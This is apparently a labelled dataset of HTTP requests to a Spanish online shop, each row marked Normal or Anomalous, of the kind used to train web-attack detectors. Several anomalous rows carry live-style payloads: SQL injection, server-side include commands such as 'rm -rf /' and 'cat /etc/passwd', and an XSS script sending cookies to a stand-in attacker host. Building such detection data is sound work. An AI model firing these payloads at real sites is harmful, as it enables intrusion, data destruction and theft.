raw_log,classification
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=tomaszew&password=capillero&nombre=Robustiana&apellidos=Sabater+Esp%EDndola&email=leighton%40pedro-mu%F1oz.gs&dni=33035723H&direccion=C%2F+Transportes+70+&ciudad=B%E1rboles&cp=+&provincia=Palencia&ntc=6125129848113122&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=romani&pwdA=examEN&remember=off&B1=Entrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/menum.jsp/asf-logo-wide.gif HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=grainger&password=dilecci%F3n&nombre=%3FBa%27bel-i&apellidos=Rodamila&email=nazimova%40ibizasounds.sh&dni=47610956J&direccion=C%2F+Selva%2C+14%2C+5%3FF&ciudad=Farrera&cp=18290&provincia=Madrid&ntc=8021682596257423&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=snuggs&password=Recie.ntE&nombre=Caritian&apellidos=Celaya+Gaytan&email=treman_worde%40pavimentosalagon.so&dni=75925253E&direccion=Carrer+Sant+Celoni+39%2C+8-H&ciudad=Cepeda+la+Mora%7C&cp=45200&provincia=Sevilla&ntc=0439326406567851&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=bouchard&pwd=6h11a3rud9&remember=off&B1=Entrar,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=5&B1=A%F1adir+al+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dulsea&pwdA=puzolana&remember=off&B1=Entrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=boudin&password=intErpRetAci%D3n&nombre=Alcib%EDades&apellidos=Ferrandi+Moja&email=leistiko%40soymadrile%F1o.je&dni=21274501F&direccion=Travesia+Travesia+1+Isaac+Peral%2C+S%2FN+&ciudad=Aldea+del+Rey&cpA=09091&provincia=Segovia&ntc=2482906400759424&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=chaar&pwd=pe4ibl171o&rememberA=on&B1=Entrar,Anomalous
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=gladstei&password=MAldItAmENTe&nombre=Isabel&apellidos=Verdes&email=turtuno%40touringa.hu&dni=07995079A&direccion=Campa+Zabala+184%2C+&ciudad=D%EDlar&cp=23628&provincia=Soria&ntc=3527135091788318&B1=Registrar,Normal
GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=4641&B1A=Confirmar,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=1&nombre=Vino+Rioja&precio=39&cantidad=66&B1=%2B,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=2018&B1=Pasar+por+caja HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/asf-logo-wide.gif.bak HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lachine&password=contrAamura&nombre=Nicasia&apellidos=Coyoma+Abia&email=padovani%40thequeenworm.mp&dni=78419891B&direccion=Avenida+Castilla-la+Mancha+187%2C+3-D&ciudad=Sagrada%2C+La&cp=09318&provincia=A+Coru%F1a%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&ntc=4808153993761167&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=%27+DELETE+FROM+USERS,Anomalous
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=39&cantidad=25&B1=A%F1adir+al+carrito%4040 HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsgA=Credenciales+incorrectas,Anomalous
GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=teodoro&password=b9h%FA4a&nombre=Meliano&apellidos=Leiro+Bald%ED&email=miric%40deuxmanagement.an&dni=09475421L&direccion=Calle+Cuevas+Del+Siete+34+&ciudadA=Calzada+de+Don+Diego&cp=16708&provincia=Burgos&ntc=8487233269433512&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kwangchi&pwd=73spoJador&remember=off&B1=Entrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=wonuk&password=pulverizador&nombre=Mahoma&apellidos=Alorda+Goicoechea&email=boyne.winds%40elrincondelm%40%40armol.%40cd&dni=08512419G&direccion=Calle+Amanecer+105+&ciudad=Fuente+de+San+Esteban%2C+La&cp=16611&provincia=Huelva&ntc=9776865441504888&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=karattup&password=-s9rete&nombre=Melqu%EDades&apellidos=Tutusaus+Tenza&email=pious-muszte9%40prestigecars.sg&dni=34855320Q&direccion=Urbanitzacio+Europa-fuentes+De+San+Bernabe+S%2FN%2C+&ciudad=Aldeanueva+de+Santa+Cruz&cp=46145&provincia=Ciudad+Real&ntc=0512840344034121&B1=Registrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modoA=entrar&login=simon-ch&pwd=Sur%3FTidO&remember=on&B1=Entrar,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=30&B1=A%F1adir+al+carrito,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=chung&password=us0j6&nombre=Argeo&apellidos=Barco+Montull&email=bowen-gugolka%40soyriojano.name&dni=84881293T&direccion=Calle+Horreo+85+10%3FD&ciudad=Ruesga&cp=45516&provincia=Almer%EDa&ntc=3582076186939679&B1=Registrar,Normal
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=beate&pwd=esp8rtillero%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&remember=off&B1=Entrar,Anomalous
GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=waller&pwd=3997o9a02&remember=on&B1=Entrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=cirulli&password=exployada&nombre=Nadini&apellidos=Siset+Marcher&email=hell.nomura%40velazquezlarra%F1aga.am&dni=61186493F&direccion=C%2F+Rafael+Company+%22farmaceutic%22%2C+135%2C+&ciudad=Salas+Altas&cp=01039&provincia=Guadalajara&ntc=9812245040414546%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=kudrewat&pwd=63eb2ya&remember=on&B1=Entrar,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=yoonmo2&pwd=azo5da&remember=on%2F&B1=Entrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=eiji&password=astrolito&nombre=Leda&apellidos=Carrizales+O%F1ate&email=davril_pallin0%40evelin.com.cz&dni=50932385N&direccion=Manuel+Monterrey+Calvo%2C+186%2C+&ciudad=Berja&cp=03560&provincia=Ciudad+Real&ntc=1206132385577691&B1=Registrar,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bohyun&pwd=1illabarqu%ED2&remember=on&B1=Entrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kingston&password=tRaSPlAnTe&nombre=Johana&apellidos=Olaz%E1bal+Alongi&email=lobe-cary%40videoerotic.mh&dni=86807165J&direccion=Calle+Olof+Palme+S%2FN%2C+&ciudadA=Navezuelas&cp=44330&provincia=Navarra&ntc=4852910314860020&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/index.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=801&B1=Pasar+por+caja%2F,Anomalous
GET http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=maupin&password=pu552lmen34&nombre=Ta%EDs&apellidos=Yepes+Vall&emailA=sova%40tarifasdevuelos.ml&dni=74740920M&direccion=Lanzarote%2C+37+&ciudad=Cat%ED&cp=25403&provincia=Zamora&ntc=3946035396869059&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=tsong-li0&pwd=4oM4a1rO173To&remember=on&B1A=Entrar,Anomalous
GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,Normal
GET http://localhost:8080/?Open HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=21&B1=A%F1adir+al+carrito,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=25&B1=A%F1adir+al+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2A=Vaciar+carrito,Anomalous
GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=shibo&pwd=3l8rinet03ta&remember=on%2F&B1=Entrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=9043&B1=Pasar+por+caja,Normal
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precioA=8816&B1=Pasar+por+caja,Anomalous
GET http://localhost:8080/tienda1/global/creditos.jsp.java HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%2500 HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=1,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bejar&password=litiGaR&nombre=Enzo&apellidos=%3FJ-o-dar&email=borgato%4019horas.ee&dni=96483882D&direccion=Esperanto%2C+182%2C+&ciudad=Sobremunt&cp=19278&provincia=Alicante&ntc=2319237634289833&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=3&nombre=Queso+Manchego&precio=100&cantidad=6&B1=A%F1adir+al+carrito,Normal
GET http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,Normal
GET http://localhost:8080/WebSphereSamples/ HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=3&nombreA=Queso+Manchego&precio=100&cantidad=52&B1=A%F1adir+al+carrito,Anomalous
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=gavens0&password=revirado&nombre=Kaya&apellidos=Mojeda+Batet&email=munshin%40cirugiaplasticacordoba.hk&dni=65532112Y&direccion=Plaza+Flauta+16%2C+1%3FB&ciudad=Valdeavellano+de+Tera&cp=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&provincia=Teruel&ntc=2452355001922764&B1=Registrar,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=3&nombre=Vino+Rioja&precio=100&cantidad=86&B1=A%F1adir+al+carrito,Normal
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=28&B1=A%F1adir+al+carrito,Normal
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/carrito.jsp/asf-logo-wide HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&nombre=Vino+Rioja&precio=39&cantidad=2&B1=A%F1adir+al+carrito,Anomalous
GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico~ HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=1477&B1=Pasar+por+caja,Normal
GET http://localhost:8080/samples/sampsite/sampsite.htm HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&loginA=krowlek&pwd=veintidoseno&remember=off&B1=Entrar,Anomalous
GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=lynnette&password=do&nombre=Huen%FA&apellidos=Busquet+Ojelja&email=villafane%40digitalcorp.cx&dni=05917539F&direccion=C%2F+%2BHerradura%2C+S%2FN%2C+8H&ciudad=Errigoiti&cp=16193&provincia=Huesca&ntc=9511633114834484&B1=Registrar,Anomalous
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2A=Vaciar+carrito,Anomalous
GET http://localhost:8080/tienda1/global/estilos.css.Bak HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=eggebraa&pwd=enALtEceDOr&remember=on&B1=Entrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=52&B1=A%F1adir+al+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%2500 HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=%27+AND+%271%27%3D%271&login=cinderel&password=rel%2Bigionario&nombre=Kenneth&apellidos=Hijodalgo+Formiga&email=gil-botelho%40miami-beach.com.info&dni=81551229Z&direccion=El+Arquero%2C+143%2C+1%3FD&ciudad=Amurrio&cp=37170&provincia=Segovia&ntc=8326601768414043&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,Normal
GET http://localhost:8080/tienda1/index.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/index.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Ques%2Bo+Manchego&precio=85&cantidad=10&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registrosessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&login=paxton&password=e4TE9ADa&nombre=Hermelinda&apellidos=Llorente+Batllori&email=kawazu3%40alquilerpantallasled.org&dni=79540644C&direccion=Cami%F1o+Dentagron+68%2C+&ciudad=San+Mart%EDn+del+R%EDo&cp=33909&provincia=Teruel&ntc=3393638948319901&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carrito%2B,Anomalous
GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,Normal
GET http://localhost:8080/iisadmpwd/aexp3.htr HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=dirck&password=.espejo&nombre=Audelino&apellidos=Cajahuanca+Barberan&email=villatios%40cpanelweb.ie&dni=10155328T&direccion=C%2F+Pedro+Guezala+192%2C+6%3FA&ciudad=Casserres&cp=50692&provincia=Almer%EDa&ntc=0345951332248071&B1=Registrar,Normal
GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 idA=2,Anomalous
GET http://localhost:8080~ HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=daesik2&password=24%ED58ca1e581&nombre=Panciano&apellidos=Masc%F3+Pr*.ado&email=dorsay.thursby%40elrincondelmarmol.pr&dni=51834543H&direccion=Cabo+De+Agua%2C+S%2FN+&ciudad=Villafranca+de+los+Barros&cp=21240&provincia=Ja%E9n&ntc=8319637256237029&B1=Registrar,Anomalous
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=dongmoon&passwordA=va7icinio&nombre=Amru&apellidos=Corado+Bon%EDas&email=kempson%40ajuntamentbcn20.pw&dni=41944516Z&direccion=Gran+passeig+De+Ronda%2C+34%2C+&ciudad=Laroya&cp=12170&provincia=%C1vila&ntc=2439487997565772&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,Normal
GET http://localhost:8080/4861362529278789730 HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp/asf-logo-wide.gif/ HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=asme&pwd=r57qu0ller3&remember=off&B1=Entrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=pebrook&password=5ica7er1&nombre=Edgar&apellidos=Sumariva+Santamar%EDa&email=rosanova-angelo%40dissident.mm&dni=43646821C&direccion=Via+Complutense%2C+76%2C+&ciudadA=Miguelturra&cp=09390&provincia=Palencia&ntc=8153377554882034&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=valletparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&pwd=a1r6e0o9&remember=on&B1=Entrar HTTP/1.1,Anomalous
PUT http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=1&nombre=Queso+Manchego&precio=85&cantidad=65&B1=A%F1adir+al+carrito,Anomalous
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=calmenso&password=amanojada&nombre=%2FWilfred%3Fo&apellidos=Lazcano+Lujan&email=waldon%40blueeyes.tr&dni=69469940G&direccion=Calle+Coquina%2C+5%2C+&ciudad=Lecr%EDn&cp=47480&provincia=Girona&ntc=4840542188767205&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=herak&password=v1373948c6a&nombre=Malinda&apellidos=Diclo+Ornosa&email=schull%40cursosenlaplaya.ro&dni=A1A28731H&direccion=Pasaje+Arcillero%2C+177%2C+2%3FG&ciudad=Pedrosa+del+Rey&cp=37874&provincia=Cuenca&ntc=3359754319393302&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=1paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2,Anomalous
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modoA=registro&login=yurchuk&password=afRAnCeSar&nombre=Dalinda&apellidos=Tiviroli+Xaubet&email=argo.freyndikh%40sanchezgordo.lc&dni=67911701S&direccion=Eivissa%2C+47+&ciudad=Fonzaleche&cp=47463&provincia=Ourense&ntc=1677358108107194&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/asf-logo-wide.gif/ HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=anand&password=potroso&nombre=Eduviges&apellidos=Esta%F1ol+Bellet&email=verdier%40zaya.name&dni=62258107M&direccion=C%2F+San+Pablo+130%2C+8H&ciudad=V%EDznar&cp=50140&provincia=Alicante&ntc=2780139956948714&B1=Registrar,Normal
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=2,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=prestipi&password=trinar&nombre=Sulamita&apellidos=Serrat&email=warbeck%40tabernarinconete.tz&dni=52485262K&direccion=Calle+Monges%2C+28%2C+3-F&ciudad=Banyalbufar&cpA=05292&provincia=Zamora&ntc=5196721943648454&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp.java HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=1%27INJECTED_PARAM,Anomalous
GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dyment&password=Z5R1174oSa&nombre=Sadoc&apellidos=Oruna&email=lewwis.mall%40epbx.pg&dni=62162273N&direccion=C%2F+Veinat+De+Cerdanyola%2C+3+6E&ciudad=Tagamanent&cp=09133&provincia=Le%F3n&ntc=3798715775380607&B1=Registrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=3&nombre=Vino+Rioja&precio=85&cantidad=95&B1=A%F1adir+al+carrito,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp.Old HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=crosby&password=to85lo372&nombre=Mat%EDas&apellidos=Carbonell+Calvet&email=addie%40logiteclines.zm&dni=78218686X&direccion=San+Ildefonso+133%2C+&ciudad=Toro&cp=19244&provincia=Salamanca&ntc=8928022470323777&B1=Registrar,Normal
GET http://localhost:8080/tienda1/4861362529278789730 HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=selva&password=cresta-da&nombre=Filomena&apellidos=Grigoriu+Matons&email=delavanti%40brunoseguridad.by&dni=28318850P&direccion=Calle+San+Isidro+Labrador+188%2C+13%3FH&ciudad=Carcel%E9n&cp=50692&provincia=Murcia&ntc=6210304125395954&B1=Registrar,Normal
GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6987&B1A=Pasar+por+caja HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5592&B1A=Confirmar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/asf-logo-wide HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/vaciar.jsp/4861362529278789730 HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,Normal
